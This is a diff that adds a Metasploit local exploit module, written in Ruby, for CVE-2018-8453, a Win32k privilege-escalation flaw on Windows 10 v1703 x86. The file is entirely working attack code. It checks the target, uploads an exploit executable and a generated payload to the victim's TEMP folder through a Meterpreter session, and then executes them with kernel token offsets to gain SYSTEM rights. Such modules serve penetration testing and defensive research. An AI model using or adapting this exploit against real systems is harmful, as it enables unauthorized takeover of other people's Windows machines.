@@ -1,0 +1,106 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Post::Windows::Priv
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+    'Name'            => 'Windows NtUserSetWindowFNID Win32k User Callback',
+    'Description'     => %q{
+        An elevation of privilege vulnerability exists in Windows when the Win32k component
+        fails to properly handle objects in memory, aka "Win32k Elevation of Privilege Vulnerability."
+        This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows
+        Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2,
+        Windows 10, Windows 10 Servers.
+
+        This module is tested against Windows 10 v1703 x86.
+      },
+    'License'         => MSF_LICENSE,
+    'Author'          => [
+        'ze0r',           # Exploit analysis and PoC
+        'Kaspersky Lab',  # Vulnerability discovery/detection
+        'Jacob Robles'    # Metasploit module
+      ],
+    'Platform'        => 'win',
+    'Arch'            => ARCH_X86,
+    'SessionTypes'    => [ 'meterpreter' ],
+    'DefaultOptions'  => {
+        'EXITFUNC'    => 'thread'
+      },
+    'Targets'         => [
+        [ 'Windows 10 v1703 (Build 15063) x86', {
+            'UniqueProcessIdOffset' => 180,
+            'TokenOffset' => 252,
+            'Version' => 'Windows 10 (Build 15063)'
+          }
+        ]
+      ],
+    'References'      => [
+        ['CVE', '2018-8453'],
+        ['URL', 'https://github.com/ze0r/cve-2018-8453-exp'],
+        ['URL', 'https://mp.weixin.qq.com/s/ogKCo-Jp8vc7otXyu6fTig'],
+        ['URL', 'https://mp.weixin.qq.com/s/dcbUeegM0BqErtDufOXfoQ'],
+        ['URL', 'https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/'],
+        ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453']
+      ],
+    'Notes' => {
+        'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],
+        'Stability'   => [CRASH_OS_RESTARTS]
+      },
+    'DisclosureDate'  => '2018-10-09',
+    'DefaultTarget'   => 0
+    ))
+  end
+
+  def target_info
+    fail_with(Failure::None, 'Session is already elevated') if is_system?
+
+    unless sysinfo['OS'].start_with?(target['Version']) && sysinfo['Architecture'] == 'x86'
+      fail_with(Failure::NoTarget, 'Target is not compatible with exploit')
+    end
+  end
+
+  def write_file_to_target(fname, data)
+    tempdir = session.sys.config.getenv('TEMP')
+    file_loc = "#{tempdir}\\#{fname}"
+    vprint_warning("Attempting to write #{fname} to #{tempdir}")
+    write_file(file_loc, data)
+    vprint_good("#{fname} written")
+    file_loc
+  rescue Rex::Post::Meterpreter::RequestError => e
+    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    fail_with(Failure::Unknown, "Writing #{fname} to disk was unsuccessful")
+  end
+
+  def exploit
+    target_info
+    exe_name = 'CVE-2018-8453.exe'
+    exe_path = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8453', exe_name)
+    vprint_status("Reading payload from file #{exe_path}")
+    raw = File.read(exe_path)
+
+    tmp_exe = "#{Rex::Text.rand_text_alphanumeric(10)}.exe"
+    vprint_status("Uploading exploit exe as: #{tmp_exe}")
+    exe_rpath = write_file_to_target(tmp_exe, raw)
+    register_file_for_cleanup(exe_rpath)
+
+    tmp_payload = "#{Rex::Text.rand_text_alpha(6..14)}.exe"
+    payload_rpath = write_file_to_target(tmp_payload, generate_payload_exe)
+    vprint_status("Uploading payload #{tmp_payload}")
+    register_file_for_cleanup(payload_rpath)
+
+    command = "\"#{exe_rpath}\" \"#{payload_rpath}\" #{target['UniqueProcessIdOffset']} #{target['TokenOffset']}"
+
+    vprint_status("Executing command: #{command}")
+    session.sys.process.execute(command, nil, {'Hidden' => false})
+    print_good('Exploit finished, wait for privileged payload execution to complete.')
+  end
+end
